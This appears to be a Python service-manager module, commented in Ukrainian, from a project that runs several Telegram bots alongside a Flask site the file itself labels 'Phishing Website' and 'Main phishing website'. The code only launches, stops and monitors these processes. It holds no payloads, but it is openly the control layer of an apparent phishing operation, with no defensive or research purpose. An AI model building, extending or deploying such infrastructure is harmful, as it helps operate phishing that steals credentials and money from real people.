# core/service_manager.py - ОНОВЛЕНІ ШЛЯХИ
import logging
import subprocess
import os
from typing import Dict, Any

logger = logging.getLogger(__name__)

class ServiceManager:
    def __init__(self):
        # Оновлюємо шляхи до run_files папки
        run_files_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'run_files')
        
        self.services = {
            'admin_bot': {
                'name': 'Admin Bot',
                'process': None,
                'status': 'offline',
                'command': ['python', os.path.join(run_files_dir, 'run_adminbot.py')],
                'description': 'Telegram bot for system management'
            },
            'webapp_bot': {
                'name': 'WebApp Bot',
                'process': None,
                'status': 'offline',
                'command': ['python', os.path.join(run_files_dir, 'run_webapp_bot.py')],
                'description': 'Telegram bot with WebApp interface'
            },
            'classic_bot': {
                'name': 'Classic Bot',
                'process': None,
                'status': 'offline',
                'command': ['python', os.path.join(run_files_dir, 'run_classic_bot.py')],
                'description': 'Telegram bot with inline buttons'
            },
            'multitool_bot': {
                'name': 'Multitool Bot',
                'process': None,
                'status': 'offline',
                'command': ['python', os.path.join(run_files_dir, 'run_multitool_bot.py')],
                'description': 'Telegram bot with useful tools'
            },
            'phishing_site': {
                'name': 'Phishing Website',
                'process': None,
                'status': 'online',  # Flask app is always running
                'command': None,
                'description': 'Main phishing website (Flask app)'
            }
        }
    
    def get_service_status(self, service_name: str) -> str:
        """Отримати статус сервісу"""
        if service_name not in self.services:
            return 'unknown'
        
        service = self.services[service_name]
        
        # Для Flask сайту завжди online
        if service_name == 'phishing_site':
            return 'online'
        
        # Перевіряємо чи процес активний
        if service['process'] and service['process'].poll() is None:
            return 'online'
        else:
            return 'offline'
    
    def start_service(self, service_name: str) -> bool:
        """Запустити сервіс"""
        try:
            if service_name not in self.services:
                logger.error(f"Unknown service: {service_name}")
                return False
            
            service = self.services[service_name]
            
            # Якщо сервіс вже запущений
            if self.get_service_status(service_name) == 'online':
                logger.info(f"Service {service_name} is already running")
                return True
            
            # Перевіряємо чи існує файл запуску
            if service['command'] and not os.path.exists(service['command'][1]):
                logger.error(f"Run file not found: {service['command'][1]}")
                return False
            
            # Запускаємо процес
            if service['command']:
                process = subprocess.Popen(
                    service['command'],
                    cwd=os.path.dirname(os.path.dirname(os.path.abspath(__file__))),  # Корінь проекту
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                service['process'] = process
                service['status'] = 'online'
                logger.info(f"Service {service_name} started successfully from {service['command'][1]}")
                return True
            else:
                logger.error(f"No command defined for service: {service_name}")
                return False
                
        except Exception as e:
            logger.error(f"Failed to start service {service_name}: {e}")
            return False
    
    # Решта методів залишаються без змін...
    def stop_service(self, service_name: str) -> bool:
        """Зупинити сервіс"""
        try:
            if service_name not in self.services:
                logger.error(f"Unknown service: {service_name}")
                return False
            
            service = self.services[service_name]
            
            # Для Flask сайту не можна зупинити
            if service_name == 'phishing_site':
                logger.warning("Cannot stop Flask phishing site")
                return False
            
            # Зупиняємо процес
            if service['process']:
                service['process'].terminate()
                try:
                    service['process'].wait(timeout=10)
                except subprocess.TimeoutExpired:
                    service['process'].kill()
                
                service['process'] = None
                service['status'] = 'offline'
                logger.info(f"Service {service_name} stopped successfully")
                return True
            else:
                logger.info(f"Service {service_name} is not running")
                return True
                
        except Exception as e:
            logger.error(f"Failed to stop service {service_name}: {e}")
            return False
    
    def restart_service(self, service_name: str) -> bool:
        """Перезапустити сервіс"""
        try:
            # Спочатку зупиняємо
            if self.get_service_status(service_name) == 'online':
                self.stop_service(service_name)
            
            # Потім запускаємо
            return self.start_service(service_name)
            
        except Exception as e:
            logger.error(f"Failed to restart service {service_name}: {e}")
            return False
    
    def start_all_services(self) -> bool:
        """Запустити всі сервіси"""
        try:
            results = []
            for service_name in self.services:
                if service_name != 'phishing_site':  # Flask app is always running
                    result = self.start_service(service_name)
                    results.append(result)
            
            return all(results)
            
        except Exception as e:
            logger.error(f"Failed to start all services: {e}")
            return False
    
    def stop_all_services(self) -> bool:
        """Зупинити всі сервіси"""
        try:
            results = []
            for service_name in self.services:
                if service_name != 'phishing_site':  # Cannot stop Flask app
                    result = self.stop_service(service_name)
                    results.append(result)
            
            return all(results)
            
        except Exception as e:
            logger.error(f"Failed to stop all services: {e}")
            return False

# Глобальний екземпляр
service_manager = ServiceManager()